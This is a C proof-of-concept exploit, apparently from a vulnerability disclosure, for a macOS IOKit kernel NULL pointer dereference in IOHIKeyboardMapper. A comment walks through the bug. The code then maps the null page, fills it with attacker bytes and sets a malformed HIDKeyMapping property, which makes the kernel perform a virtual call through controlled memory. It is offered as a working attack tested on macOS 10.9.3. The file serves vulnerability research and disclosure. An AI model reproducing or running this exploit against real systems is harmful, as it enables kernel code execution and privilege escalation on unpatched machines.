/*
clang -o key_mapping_null_deref key_mapping_null_deref.c -framework IOKit -framework CoreFoundation -m32

When setting a new keyboard mapping the following code will be reached:

    IOHIKeyboardMapper * IOHIKeyboardMapper::keyboardMapper(
                                                            IOHIKeyboard * delegate,
                                                            const UInt8 *  mapping,
                                                            UInt32       mappingLength,
                                                            bool       mappingShouldBeFreed )
    {
      IOHIKeyboardMapper * me = new IOHIKeyboardMapper;
      
      if (me && !me->init(delegate, mapping, mappingLength, mappingShouldBeFreed))
      {
        me->free();

If the init method returns false, IOHIKeyboardMapper::free will be called.

    bool IOHIKeyboardMapper::init(  IOHIKeyboard *delegate,
                                  const UInt8 *map,
                                  UInt32 mappingLen,
                                  bool mappingShouldBeFreed )
    {
      if (!super::init())  return false;
      
      _delegate         = delegate;
      
      if (!parseKeyMapping(map, mappingLen, &_parsedMapping)) return false;
    ...
      _reserved = IONew(ExpansionData, 1);

If the parseKeyMapping method returns false (by supplying a malformed key mapping), the init function will return early, and won't initialize the
_reserved member.

The IOHIKeyboardMapper::free method will call stickyKeysfree() (both _parsedMapping.mapping and _parsedMapping.mappingLen
are non-zero) :

    void IOHIKeyboardMapper::free()
    {
        if (!_parsedMapping.mapping || !_parsedMapping.mappingLen)
            return;
        
        stickyKeysfree();

stickyKeysfree attempts to release all member objects which have been initialized:

    void IOHIKeyboardMapper::stickyKeysfree (void)
    {
      // release shift toggle struct
      if (_stickyKeys_ShiftToggle)
        stickyKeysFreeToggleInfo(_stickyKeys_ShiftToggle);
        
      // release option toggle struct
      if (_stickyKeys_OptionToggle)
        stickyKeysFreeToggleInfo(_stickyKeys_OptionToggle);
        
      // release on param dict
      if (_onParamDict)
        _onParamDict->release();
        
      // release off param dict
      if (_offParamDict)
        _offParamDict->release();
        
    // release off fn param dict
    if (_offFnParamDict)                 <-- (a)
    _offFnParamDict->release();          <-- (b)

However, at (a) _offFnParamDict isn't actually a member but the following macro:

    #define _offFnParamDict       _reserved->offFnParamDict


Since we returned early from IOHIKeyboardMapper::init before _reserved was allocated it's null.
By mapping the null page we can control the value of the offFnParamDict pointer and therefore
control the virtual function call at (b)

tested on: MacBookAir5,2 w/ 10.9.3/13d65
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>

#include <mach/mach.h>
#include <mach/vm_map.h>

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("IOHIDKeyboard");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);

  // invalid key mapping
  const uint8_t new_mapping[] = {
    0x00, 0x00, // nums are 1 byte
    0x01, //numMods
    0xff, //j (> NX_NUMMODIFIERS)
  };

  // allocate NULL page
  vm_deallocate(mach_task_self(), 0x0, 0x1000);
  vm_address_t addr = 0;
  vm_allocate(mach_task_self(), &addr, 0x1000, 0);
  char* np = 0;
  for (int i = 0; i < 0x1000; i++){
   np[i] = 'A';
  }

  CFDataRef data = CFDataCreate(NULL, new_mapping, sizeof(new_mapping));

  err = IORegistryEntrySetCFProperty(
    service,
    CFSTR("HIDKeyMapping"),
    data);
  
  if (err != KERN_SUCCESS){
    printf("setProperty failed\n");
  }

  printf("win?\n");

  return 0;
}
